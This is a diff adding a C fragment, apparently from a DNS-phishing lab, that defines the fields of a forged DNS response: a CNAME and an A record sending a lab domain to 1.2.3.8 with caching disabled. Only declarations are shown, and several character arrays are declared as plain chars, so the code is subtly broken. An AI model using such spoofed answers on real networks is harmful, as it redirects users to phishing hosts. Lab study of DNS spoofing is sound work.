@@ -1,0 +1,38 @@
+    int dnspacket_size  = 0;
+    // Header section   
+    u_short dns_tranx_id = 0;
+    u_short dns_flags   = 0x8000;
+    u_short dns_qdcount = 0x0001;
+    u_short dns_ancount = 2;
+    u_short dns_nscount = 0;
+    u_short dns_arcount = 0;
+
+    // Question section
+    char qname      = {0x03,'a','b','c',0x0e,'d','n','s','p','h','i','s','h','i','n','g',
+                        'l','a','b',0x03,'c','o','m',0x00,'\0'}; // query host name
+    int qname_len   = 24;
+    u_short qtype   = 0x01; //A (host address)
+    u_short qclass  = 0x01; // IN
+
+    //RR ans 1  
+    char ans1_name          = {0x03,'a','b','c',0x0e,'d','n','s','p','h','i','s','h','i','n','g',
+                                'l','a','b',0x03,'c','o','m',0x00,'\0'} ; // ans host name
+    int ans1_name_len       = 24;
+    u_short ans1_type       = 0x05; // cname
+    u_short ans1_class      = 0x01; // IN
+    u_int ans1_ttl          = 0x0000; //don't cache (usually time period in seconds)
+    u_short ans1_rdlength   = 0x0018; // length of rdata
+    int ans1_rdata_len      = 24;
+    char ans1_rdata         = {0x03,'w','w','w',0x0e,'d','n','s','p','h','i','s','h','i','n','g',
+                                                'l','a','b',0x03,'c','o','m',0x00,'\0'};
+    //RR ans 2  
+    char ans2_name          = {0x03,'w','w','w',0x0e,'d','n','s','p','h','i','s','h','i','n','g',
+                                                'l','a','b',0x03,'c','o','m',0x00,'\0'};
+    int ans2_name_len       = 24;
+    u_short ans2_type       = 0x01; // A (host address)
+    u_short ans2_class      = 0x01; // IN
+    u_int ans2_ttl          = 0x0000; //don't cache (caching duration in second) 
+    u_short ans2_rdlength   = 0x0004; // length of data
+    int ans2_rdata_len      = 4;
+    u_char ans2_rdata[5]    = {0x01, 0x02, 0x03, 0x08, 0x00}; //RR data field
+
